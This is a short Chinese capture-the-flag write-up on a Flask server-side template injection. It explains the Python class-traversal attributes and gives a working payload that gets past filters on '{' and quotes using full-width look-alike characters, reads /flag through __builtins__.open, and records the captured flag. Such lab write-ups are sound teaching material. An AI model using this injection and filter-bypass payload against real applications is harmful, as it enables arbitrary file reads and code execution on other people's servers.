# Easy_Web

> flask ssti注入,{和'字符绕过

## 思路分析

> \_\_class\_\_  返回类型所属的对象
> \_\_mro\_\_    返回一个包含对象所继承的基类元组,方法在解析时按照元组的顺序解析
> \_\_base\_\_   返回该对象所继承的基类
> \_\_base\_\_和\_\_mro\_\_    都是用来寻找基类的
> \_\_subclasses\_\_   每个新类都保留了子类的引用,这个方法返回一个类中仍然可用的的引用的列表
> \_\_init\_\_  类的初始化方法
> \_\_globals\_\_  对包含函数全局变量的字典的引用

> flask ssti注入,过滤了{和'字符,{可以用︷代替,'可以用＇来代替

## payload

> ︷︷().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__[＇open＇](＇/flag＇).read()︸︸


## flag

> flag{8f604f91-c36a-4413-bdaf-e786ffbfda61}

## 参考

> https://xz.aliyun.com/t/3679
> https://blog.csdn.net/qq_45774670/article/details/110223398
> http://www.fhdq.net/